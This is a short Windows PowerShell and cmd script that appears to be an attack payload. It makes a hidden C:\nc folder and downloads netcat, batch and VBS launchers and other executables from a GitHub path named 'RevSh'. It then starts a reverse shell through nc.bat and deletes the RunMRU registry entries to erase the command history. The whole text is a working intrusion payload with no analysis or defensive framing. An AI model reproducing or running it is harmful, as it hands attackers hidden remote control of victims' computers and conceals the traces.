cmd /c "md C:\nc"
cmd /c "attrib +h C:\nc"
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.bat","C:\nc\nc.bat")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.vbs","C:\nc\nc.vbs")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.exe","C:\nc\nc.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/rh.exe","C:\nc\rh.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/voice.exe","C:\nc\voice.exe")
Start-Sleep -s 5
cmd.exe /c C:\nc\rh.exe C:\nc\nc.bat
cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
